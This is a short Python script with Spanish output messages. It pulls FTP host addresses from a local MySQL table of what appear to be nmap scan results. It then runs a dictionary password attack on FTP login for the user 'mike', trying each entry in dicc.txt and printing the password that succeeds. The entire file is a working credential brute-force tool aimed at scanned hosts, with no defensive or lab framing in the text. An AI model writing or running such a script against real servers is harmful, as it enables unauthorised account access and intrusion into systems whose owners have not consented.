import os
from ftplib import FTP
import mysql.connector as mysql

conexion = mysql.connect( 
    host='localhost',
    user= 'root',
    passwd='',
    db='nmap' )
    
cursor = conexion.cursor()
cursor.execute( "select ip from host where servicio = 'ftp';")
for ip in cursor.fetchall() :
      print (ip)
conexion.close()
host = str(ip[0])
print(host)

host = host
usuario = "mike"

f = open("dicc.txt","r")
text = ""
for linea in f.readlines(): 
    text += linea
f.close()
clave = text.split('\n')
r = len(clave)
print("PROBANDO CON " + str(r) + " CLAVES DEL DICCIONARIO")
for i in range(r-1):
    try:
        conexion = FTP(host)
        conexion.login(usuario, str(clave[i]))
        print("\nCONEXION ESTABLECIDA CON LA CONTRASEÑA: "+ str(clave[i])+"\n")
        break
    except:
        print("\nFalló la conexión con la contraseña: "+ str(clave[i])+"\n")